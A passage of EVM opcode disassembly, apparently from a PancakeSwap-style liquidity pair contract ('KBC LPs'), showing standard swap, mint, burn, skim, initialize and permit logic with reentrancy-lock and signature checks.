JUMPDEST POP POP PUSH2 0xBB1 DUP5 DUP5 DUP9 DUP9 PUSH2 0x1EB6 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP4 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP4 SWAP1 MSTORE DUP1 DUP3 ADD DUP14 SWAP1 MSTORE PUSH1 0x60 DUP2 ADD DUP13 SWAP1 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP12 AND SWAP2 CALLER SWAP2 PUSH32 0xD78AD95FA46C994B6551D0DA85FC275FE613CE37657FB8D5E3D130840159D822 SWAP2 DUP2 SWAP1 SUB PUSH1 0x80 ADD SWAP1 LOG3 POP POP PUSH1 0x1 PUSH1 0xF SSTORE POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7 DUP2 MSTORE PUSH1 0x20 ADD PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0xB SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP3 PUSH1 0x1 PUSH1 0x70 SHL DUP4 DIV SWAP1 SWAP2 AND SWAP2 PUSH1 0x1 PUSH1 0xE0 SHL SWAP1 DIV PUSH4 0xFFFFFFFF AND SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC71 CALLER DUP5 DUP5 PUSH2 0x2079 JUMP JUMPDEST POP PUSH1 0x1 JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x8 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0xCDE JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x12 PUSH1 0x24 DUP3 ADD MSTORE PUSH18 0x2830B731B0B5B29D102327A92124A22222A7 PUSH1 0x71 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x8 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 DUP6 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT SWAP2 DUP3 AND OR SWAP1 SWAP2 SSTORE PUSH1 0x9 DUP1 SLOAD SWAP4 SWAP1 SWAP5 AND SWAP3 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SWAP2 SSTORE PUSH1 0xA SSTORE JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE DUP2 KECCAK256 SLOAD PUSH1 0x0 NOT EQ PUSH2 0xD9E JUMPI PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SLOAD PUSH2 0xD79 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SSTORE JUMPDEST PUSH2 0xDA9 DUP5 DUP5 DUP5 PUSH2 0x20DB JUMP JUMPDEST POP PUSH1 0x1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 JUMP JUMPDEST PUSH1 0x12 DUP2 JUMP JUMPDEST PUSH1 0x4 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xC SLOAD DUP2 JUMP JUMPDEST PUSH1 0xD SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0xE4B JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF DUP2 SWAP1 SSTORE DUP1 PUSH2 0xE5B PUSH2 0xC3A JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP4 SWAP6 POP SWAP2 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xEAF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xEC3 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xED9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP3 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF2C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xF40 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xF56 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 POP PUSH1 0x0 PUSH2 0xF75 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xF92 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xFA0 DUP8 DUP8 PUSH2 0x2183 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0xFDD JUMPI PUSH2 0xFC9 PUSH2 0x3E8 PUSH2 0xAFD PUSH2 0xFC4 DUP8 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0x22F6 JUMP JUMPDEST SWAP9 POP PUSH2 0xFD8 PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x2348 JUMP JUMPDEST PUSH2 0x102C JUMP JUMPDEST PUSH2 0x1029 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0xFFA DUP7 DUP5 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x1001 JUMPI INVALID JUMPDEST DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0x101C DUP7 DUP6 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x1023 JUMPI INVALID JUMPDEST DIV PUSH2 0x23CC JUMP JUMPDEST SWAP9 POP JUMPDEST PUSH1 0x0 DUP10 GT PUSH2 0x106B JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2690 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1075 DUP11 DUP11 PUSH2 0x2348 JUMP JUMPDEST PUSH2 0x1081 DUP7 DUP7 DUP11 DUP11 PUSH2 0x1EB6 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x10B1 JUMPI PUSH1 0xB SLOAD PUSH2 0x10AD SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH1 0xE SSTORE JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP6 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP6 SWAP1 MSTORE DUP2 MLOAD CALLER SWAP3 PUSH32 0x4C209B5FC8AD50758F13E2E1088BA56A560DFF690A1C6FEF26394F4C03821C4F SWAP3 DUP3 SWAP1 SUB ADD SWAP1 LOG2 POP POP PUSH1 0x1 PUSH1 0xF SSTORE POP SWAP5 SWAP7 SWAP6 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xE SLOAD DUP2 JUMP JUMPDEST PUSH1 0x5 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x1174 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF DUP2 SWAP1 SSTORE DUP1 PUSH2 0x1184 PUSH2 0xC3A JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP5 SWAP7 POP SWAP3 SWAP5 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND SWAP4 SWAP2 AND SWAP2 PUSH1 0x0 SWAP2 DUP5 SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x11E0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x11F4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x120A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP3 POP PUSH1 0x0 SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1258 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x126C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1282 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD ADDRESS PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP2 KECCAK256 SLOAD SWAP2 SWAP3 POP PUSH2 0x12A1 DUP9 DUP9 PUSH2 0x2183 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0x12B8 DUP5 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x12BF JUMPI INVALID JUMPDEST DIV SWAP11 POP DUP1 PUSH2 0x12D3 DUP5 DUP7 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x12DA JUMPI INVALID JUMPDEST DIV SWAP10 POP PUSH1 0x0 DUP12 GT DUP1 ISZERO PUSH2 0x12ED JUMPI POP PUSH1 0x0 DUP11 GT JUMPDEST PUSH2 0x1328 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2627 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1332 ADDRESS DUP5 PUSH2 0x23E4 JUMP JUMPDEST PUSH2 0x133D DUP8 DUP14 DUP14 PUSH2 0x1C69 JUMP JUMPDEST PUSH2 0x1348 DUP7 DUP14 DUP13 PUSH2 0x1C69 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP10 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x138E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x13A2 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x13B8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP7 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP9 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1404 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1418 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x142E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP4 POP PUSH2 0x143E DUP6 DUP6 DUP12 DUP12 PUSH2 0x1EB6 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x146E JUMPI PUSH1 0xB SLOAD PUSH2 0x146A SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH1 0xE SSTORE JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP13 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP13 SWAP1 MSTORE DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP16 AND SWAP3 CALLER SWAP3 PUSH32 0xDCCD412F0B1252819CB1FD330B93224CA42612892BB3F4F789976E6D81936496 SWAP3 SWAP1 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP POP POP POP POP POP POP PUSH1 0x1 PUSH1 0xF DUP2 SWAP1 SSTORE POP SWAP2 POP SWAP2 JUMP JUMPDEST PUSH1 0x6 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH6 0x4B42432D4C5 PUSH1 0xD4 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC71 CALLER DUP5 DUP5 PUSH2 0x20DB JUMP JUMPDEST PUSH2 0x3E8 DUP2 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x1559 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF SSTORE PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD PUSH1 0xB SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 DUP6 AND SWAP5 SWAP1 SWAP4 AND SWAP3 PUSH2 0x1608 SWAP3 DUP6 SWAP3 DUP8 SWAP3 PUSH2 0x1603 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SWAP2 DUP6 SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x15CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x15DF JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x15F5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH2 0x1C69 JUMP JUMPDEST PUSH1 0xB SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH2 0x166F SWAP3 DUP5 SWAP3 DUP8 SWAP3 PUSH2 0x1603 SWAP3 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x15CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP PUSH1 0x1 PUSH1 0xF SSTORE POP JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x9 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST TIMESTAMP DUP5 LT ISZERO PUSH2 0x16DF JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x10 PUSH1 0x24 DUP3 ADD MSTORE PUSH16 0x14185B98D85AD94E8811561412549151 PUSH1 0x82 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x4 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP10 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 DUP1 SLOAD PUSH1 0x1 DUP1 DUP3 ADD SWAP1 SWAP3 SSTORE DUP3 MLOAD PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 DUP7 ADD MSTORE DUP1 DUP5 ADD SWAP7 SWAP1 SWAP7 MSTORE SWAP6 DUP14 AND PUSH1 0x60 DUP7 ADD MSTORE PUSH1 0x80 DUP6 ADD DUP13 SWAP1 MSTORE PUSH1 0xA0 DUP6 ADD SWAP6 SWAP1 SWAP6 MSTORE PUSH1 0xC0 DUP1 DUP6 ADD DUP12 SWAP1 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xE0 DUP6 ADD DUP3 MSTORE DUP1 MLOAD SWAP1 DUP4 ADD KECCAK256 PUSH2 0x1901 PUSH1 0xF0 SHL PUSH2 0x100 DUP7 ADD MSTORE PUSH2 0x102 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE PUSH2 0x122 DUP1 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE DUP1 MLOAD DUP1 DUP6 SUB SWAP1 SWAP7 ADD DUP7 MSTORE PUSH2 0x142 DUP5 ADD DUP1 DUP3 MSTORE DUP7 MLOAD SWAP7 DUP4 ADD SWAP7 SWAP1 SWAP7 KECCAK256 SWAP6 DUP4 SWAP1 MSTORE PUSH2 0x162 DUP5 ADD DUP1 DUP3 MSTORE DUP7 SWAP1 MSTORE PUSH1 0xFF DUP10 AND PUSH2 0x182 DUP6 ADD MSTORE PUSH2 0x1A2 DUP5 ADD DUP9 SWAP1 MSTORE PUSH2 0x1C2 DUP5 ADD DUP8 SWAP1 MSTORE MLOAD SWAP2 SWAP4 SWAP3 PUSH2 0x1E2 DUP1 DUP3 ADD SWAP4 PUSH1 0x1F NOT DUP2 ADD SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 DUP6 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x17FA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x40 MLOAD PUSH1 0x1F NOT ADD MLOAD SWAP2 POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x1830 JUMPI POP DUP9 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ JUMPDEST PUSH2 0x1881 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1A PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E56414C49445F5349474E4154555245000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH2 0x188C DUP10 DUP10 DUP10 PUSH2 0x2079 JUMP JUMPDEST POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x18E2 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF DUP2 SWAP1 SSTORE DUP1 PUSH2 0x18F2 PUSH2 0xC3A JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP4 SWAP6 POP SWAP2 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 